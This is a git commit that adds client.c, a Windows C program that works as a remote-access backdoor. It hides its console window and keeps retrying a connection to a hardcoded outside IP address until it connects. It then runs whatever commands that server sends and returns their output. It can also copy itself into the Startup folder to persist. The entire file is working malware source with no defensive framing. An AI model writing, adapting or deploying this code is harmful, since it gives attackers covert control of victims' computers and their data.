3bbc6a5153e48e20ece23f98346b04e9decc1183
EwanJordaan <161860666+EwanJordaan@users.noreply.github.com>
2024-06-07 23:06:19 +0200

    Add files via upload

---
+++ client.c
@@ -0,0 +1,133 @@
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <string.h>
+
+#define bzero(p, size) (void) memset((p), 0, (size))
+
+int sock;
+char ip[] = "176.58.117.112";
+
+#define STARTUP_FOLDER_PATH "C:\\Users\\ewanj\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+
+void persist(const char *programPath) {
+    char startupPath[MAX_PATH];
+    snprintf(startupPath, sizeof(startupPath), STARTUP_FOLDER_PATH "client.exe");
+
+    if (!CopyFile(programPath, startupPath, FALSE)) {
+        fprintf(stderr, "Failed to copy file to Startup folder. Error: %lu\n", GetLastError());
+    } else {
+        printf("Program copied to Startup folder successfully.\n");
+    }
+}
+
+
+void Shell() {
+    char buffer[1024];
+    char container[1024];
+    char total_response[18384];
+
+    while (1) {
+        bzero(buffer, sizeof(buffer));
+        bzero(container, sizeof(container));
+        bzero(total_response, sizeof(total_response));
+
+        // Receive command from the server
+        int recv_len = recv(sock, buffer, sizeof(buffer), 0);
+        if (recv_len <= 0) {
+            perror("recv failed");
+            closesocket(sock);
+            WSACleanup();
+            exit(1);
+        }
+
+        // Check for exit command
+        if (strncmp("q", buffer, 1) == 0) {
+            closesocket(sock);
+            WSACleanup();
+            exit(0);
+        }else if (strncmp("persist", buffer, 1) == 0)
+        {
+            char programPath[MAX_PATH];
+            if (GetModuleFileName(NULL, programPath, MAX_PATH) == 0) {
+                fprintf(stderr, "Failed to get program path. Error: %lu\n", GetLastError());
+                break;
+            }
+
+            persist(programPath);
+        }else {
+            FILE *fp;
+            // Execute the received command
+            fp = _popen(buffer, "r");
+            if (fp == NULL) {
+                perror("popen failed");
+                continue;
+            }
+            while (fgets(container, sizeof(container), fp) != NULL) {
+                strcat(total_response, container);
+            }
+            // Send the command output back to the server
+            int send_len = send(sock, total_response, sizeof(total_response), 0);
+            if (send_len <= 0) {
+                perror("send failed");
+                fclose(fp);
+                closesocket(sock);
+                WSACleanup();
+                exit(1);
+            }
+            fclose(fp);
+        }
+    }
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
+    HWND stealth;
+
+    // Allocate console for the program
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+
+    // Hide the console window
+    ShowWindow(stealth, 0);
+
+    struct sockaddr_in ServAddr;
+    unsigned short ServPort;
+    char *ServIP;
+    WSADATA wsaData;
+
+    // Set server IP and port
+    ServIP = ip;
+    ServPort = 9001;
+
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
+        perror("WSAStartup failed");
+        exit(1);
+    }
+
+    // Create socket
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    if (sock == INVALID_SOCKET) {
+        perror("socket creation failed");
+        WSACleanup();
+        exit(1);
+    }
+    memset(&ServAddr, 0, sizeof(ServAddr));
+
+    ServAddr.sin_family = AF_INET;
+    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
+    ServAddr.sin_port = htons(ServPort);
+
+    // Attempt to connect to the server
+    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
+        perror("connect failed");
+        Sleep(1000);  // Sleep for a while before retrying
+    }
+
+    printf("Connected\n");
+    // Start the shell function to receive and execute commands
+    Shell();
+    return 0;
+}
